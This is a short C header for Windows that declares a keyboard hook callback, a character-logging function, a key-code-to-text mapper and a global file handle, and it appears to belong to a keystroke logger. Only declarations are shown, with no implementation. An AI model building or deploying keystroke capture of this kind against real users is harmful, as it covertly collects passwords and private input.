#ifndef NYX_HOOKING_H
#define NYX_HOOKING_H

#include <Windows.h>
#include <ctype.h>

int MAJ = 0;
int VER_NUM = 0;
FILE *fd;

LRESULT CALLBACK keyboard_hooking (int ncode, WPARAM wParam, LPARAM lParam);
void log_char(char *str);
char *map_to_txt(int vk, int up);

#endif
